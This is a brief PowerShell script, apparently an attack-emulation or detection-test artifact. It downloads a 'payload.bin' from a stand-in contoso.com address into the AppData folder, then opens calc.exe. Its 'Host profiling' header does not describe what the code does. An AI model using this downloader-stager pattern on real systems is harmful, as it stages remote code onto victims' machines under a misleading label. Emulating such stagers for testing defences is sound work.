<# Host profiling #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://contoso.com:8443/downloads/payload.bin",
    [string]$PayloadPath = "$env:APPDATA\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $PayloadPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Write-Verbose "stage marker 26 reached"
